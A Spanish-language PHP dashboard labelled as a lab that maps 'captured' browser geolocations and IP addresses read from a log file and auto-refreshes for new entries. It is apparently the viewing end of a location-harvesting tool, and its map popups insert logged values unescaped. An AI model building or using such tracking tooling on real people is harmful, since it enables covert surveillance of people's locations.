<?php
// panel.php - Panel de Capturas con mapa (usa proxy.php para tiles)
// Lee capturas.txt con formato nuevo: {"ip": "...", "time_server": "...", "data": {...}}

function leer_geo_points($file = "capturas.txt") {
    $points = [];
    if (!file_exists($file)) return $points;

    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    foreach ($lines as $line) {
        $json = json_decode($line, true);

        // Nuevo formato: buscar dentro de ["data"]
        if ($json && isset($json['data']['type']) && $json['data']['type'] === 'geo') {

            $lat  = isset($json['data']['lat']) ? floatval($json['data']['lat']) : null;
            $lon  = isset($json['data']['lon']) ? floatval($json['data']['lon']) : null;
            $acc  = isset($json['data']['accuracy']) ? $json['data']['accuracy'] : null;
            $time = isset($json['data']['time']) ? $json['data']['time'] : null;

            $ip           = isset($json['ip']) ? $json['ip'] : null;
            $time_server  = isset($json['time_server']) ? $json['time_server'] : null;

            if ($lat !== null && $lon !== null) {
                $points[] = [
                    'lat' => $lat,
                    'lon' => $lon,
                    'accuracy' => $acc,
                    'time' => $time,
                    'ip' => $ip,
                    'time_server' => $time_server
                ];
            }
        }
    }
    return $points;
}

$geoPoints = leer_geo_points();
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Panel de Capturas - Mapa</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<style>
  body { font-family: Arial, Helvetica, sans-serif; margin: 18px; }
  h1 { margin: 0 0 8px 0; }
  #map { height: 520px; width: 100%; border: 1px solid #ccc; box-sizing: border-box; }
  .panel-row { display:flex; gap:20px; align-items:flex-start; margin-top:12px; }
  .left { flex: 1; }
  .right { width: 360px; max-height:520px; overflow:auto; background:#fafafa; border:1px solid #eee; padding:10px; }
  pre { white-space: pre-wrap; word-wrap: break-word; font-size:13px; }
  .meta { font-size:12px;color:#666;margin-bottom:8px; }
  .btn { display:inline-block; padding:6px 10px; background:#0078D4; color:#fff; text-decoration:none; border-radius:4px; }
  .small { font-size:12px;color:#555; }
</style>
</head>
<body>

<h1>🔍 Panel de Capturas (Laboratorio)</h1>
<p class="meta">Muestra ubicaciones recibidas con geolocalización.</p>

<div class="panel-row">
  <div class="left">
    <div id="map">Cargando mapa...</div>
    <p class="small">Última actualización: <span id="lastUpdate">--</span> · 
      <a class="btn" href="#" id="refreshBtn">Refrescar ahora</a>
    </p>
  </div>

  <div class="right">
    <h3>Listado de ubicaciones</h3>
    <div id="list">
      <?php if (empty($geoPoints)) : ?>
        <p>No hay capturas de geolocalización.</p>
      <?php else: ?>
        <ul>
        <?php foreach ($geoPoints as $i => $p): ?>
          <li>
            <strong>#<?= $i+1 ?></strong><br>
            Lat: <?= htmlspecialchars($p['lat']) ?><br>
            Lon: <?= htmlspecialchars($p['lon']) ?><br>
            Precisión: <?= htmlspecialchars($p['accuracy']) ?> m<br>
            Hora (navegador): <?= htmlspecialchars($p['time']) ?><br>
            IP: <?= htmlspecialchars($p['ip']) ?><br>
            Hora (servidor): <?= htmlspecialchars($p['time_server']) ?>
          </li>
          <hr style="border:none;border-top:1px solid #eee;margin:8px 0;">
        <?php endforeach; ?>
        </ul>
      <?php endif; ?>
    </div>

    <p class="small">Ver archivo crudo: <a href="capturas.txt" target="_blank">capturas.txt</a></p>
  </div>
</div>

<script>
let puntos = <?php echo json_encode($geoPoints, JSON_NUMERIC_CHECK); ?>;

function initMap(points) {
    if (!points || points.length === 0) {
        document.getElementById('map').innerHTML = 'No hay datos de geolocalización.';
        return;
    }

    const last = points[points.length - 1];
    const map = L.map('map').setView([last.lat, last.lon], 15);

    L.tileLayer('proxy.php?z={z}&x={x}&y={y}', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors (proxy)'
    }).addTo(map);

    const latlngs = [];
    points.forEach((p, idx) => {
        const latlng = [p.lat, p.lon];
        latlngs.push(latlng);

        const marker = L.marker(latlng).addTo(map);

        let popup = `
            <b>Captura #${idx+1}</b><br>
            Lat: ${p.lat}<br>
            Lon: ${p.lon}<br>
            Precisión: ${p.accuracy} m<br>
            Hora (nav): ${p.time}<br>
            IP: ${p.ip}<br>
            Hora (srv): ${p.time_server}
        `;

        marker.bindPopup(popup);

        if (p.accuracy && !isNaN(p.accuracy)) {
            L.circle(latlng, { radius: Number(p.accuracy), color: "#3388ff", opacity: 0.3 }).addTo(map);
        }
    });

    if (latlngs.length > 1) {
        const poly = L.polyline(latlngs, {color:'red'}).addTo(map);
        map.fitBounds(poly.getBounds(), {padding:[30,30]});
    }

    return map;
}

let mapInstance = initMap(puntos);
document.getElementById('lastUpdate').textContent = new Date().toLocaleString();

document.getElementById('refreshBtn').addEventListener('click', e => {
    e.preventDefault();
    reloadData();
});

function reloadData() {
    fetch('capturas.txt?nocache=' + Date.now())
        .then(r => r.text())
        .then(txt => {
            const lines = txt.split(/\r?\n/).filter(Boolean);
            const newPoints = [];

            lines.forEach(line => {
                try {
                    const j = JSON.parse(line);
                    if (j && j.data && j.data.type === 'geo') {
                        newPoints.push({
                            lat: Number(j.data.lat),
                            lon: Number(j.data.lon),
                            accuracy: j.data.accuracy,
                            time: j.data.time,
                            ip: j.ip,
                            time_server: j.time_server
                        });
                    }
                } catch (err) {}
            });

            if (newPoints.length !== puntos.length) {
                location.reload();
            } else {
                document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
            }
        })
        .catch(err => console.error('Error al recargar capturas:', err));
}

setInterval(reloadData, 10000);
</script>

</body>
</html>
